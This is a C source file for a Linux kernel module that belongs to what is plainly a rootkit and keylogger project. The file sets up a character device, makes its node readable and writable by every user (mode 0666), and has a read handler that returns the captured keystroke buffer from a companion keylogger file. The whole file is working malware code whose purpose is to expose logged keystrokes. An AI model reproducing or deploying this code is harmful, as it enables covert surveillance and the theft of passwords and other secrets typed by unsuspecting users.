#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include "fops.h"
#include "simple_rootkit.h"
#include "keylogger.h"

static ssize_t device_read(struct file *, char *, size_t, loff_t *);
ssize_t device_write(struct file *, const char *, size_t, loff_t *);

// the key logging buffer from keylogger.c
extern char keystrokes[];

struct file_operations fops = {
    .read = device_read,
    .write = device_write
};

// the character device major number
static int major;

static struct cdev cdev;
static struct class *class = NULL;

// unregister and delete the objects created
static void cleanup(int device_created) {
    if (device_created) {
        device_destroy(class, major);
        cdev_del(&cdev);
    }
    if (class)
        class_destroy(class);
    if (major != -1)
        unregister_chrdev_region(major, 1);
}

// to make sure the node is readable and writeable by everyone
static char *dev_devnode(struct device *dev, umode_t *mode) {
    if (mode != NULL)
            *mode = 0666;
    return kasprintf(GFP_KERNEL, "%s", dev_name(dev));;
}

// create character device and character node, with the defined file operations
int init_fops(void) {
	int device_created = 0;

	if (alloc_chrdev_region(&major, 0, 1, DEVICE_NAME) < 0)			goto error;
	if ((class = class_create(THIS_MODULE, DEVICE_NAME)) == NULL)	goto error;
	class->devnode = dev_devnode;
	if (!device_create(class, NULL, major, NULL, DEVICE_NAME))		goto error;

	device_created = 1;

	cdev_init(&cdev, &fops);
	if (cdev_add(&cdev, major, 1) == -1)							goto error;

	return 0;

error:
	cleanup(device_created);
	return -1;
}

// release and unregister everything created
void exit_fops(void) {
	cleanup(1);
}

// read function for character device, gives the user the keystrokes
ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset) {
	size_t count = 0;
	char *msg = keystrokes;
	if(*offset == 0) {
		while (msg[count] != 0) {
			put_user(msg[count], buffer++);
			count++;
			(*offset)++;
		}
		return count;
	} else {
		return 0;
	}
}
